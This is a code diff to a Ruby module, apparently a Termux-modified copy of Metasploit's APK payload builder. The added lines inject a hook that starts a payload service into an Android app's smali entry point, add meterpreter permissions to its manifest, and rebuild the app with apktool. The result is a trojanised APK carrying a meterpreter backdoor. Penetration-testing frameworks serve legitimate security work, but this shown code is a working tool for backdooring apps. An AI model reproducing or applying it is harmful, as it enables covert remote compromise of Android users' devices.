@@ -209,4 +209,21 @@ class MSF::Payload::Apk
       newfilename = "#{payload_dir}#{smali_class}"            
       File.open(newfilename, "wb") {|file| file.puts smali}
     end
-    
+
+    payloadhook = %Q^invoke-static {}, L#{package_slash}/#{classes['MainService']};->start()V
+    ^ + entrypoint
+    hookedsmali = hooksmali.sub(entrypoint, payloadhook)
+
+    print_status "Loading #{smalifile} and injecting payload..\n"
+    File.open(smalifile, "wb") {|file| file.puts hookedsmali}
+
+    injected_apk = "#{tempdir}/output.apk"
+    print_status "Poisoning the manifest with meterpreter permission..\n"
+    fix_manifest(tempdir, package, classes['MainService'], classes['MainBroadcastReciver'])
+
+    print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk} and thanx for using my tool metasploit-termux\n"
+    print_status "Note :- this apk.rb script is written by Metasploit team (almost by my friend tim) and I am just a modifier of this script for binding payload in termux"
+        run_cmd("apktool b --aapt $PREFIX/bin/aapt -o #{injected_apk} #{tempdir}/original")
+    unless File.readable?(injected_apk)      
+      raise RuntimeError, "Unable to rebuild apk with apktool"
+    end
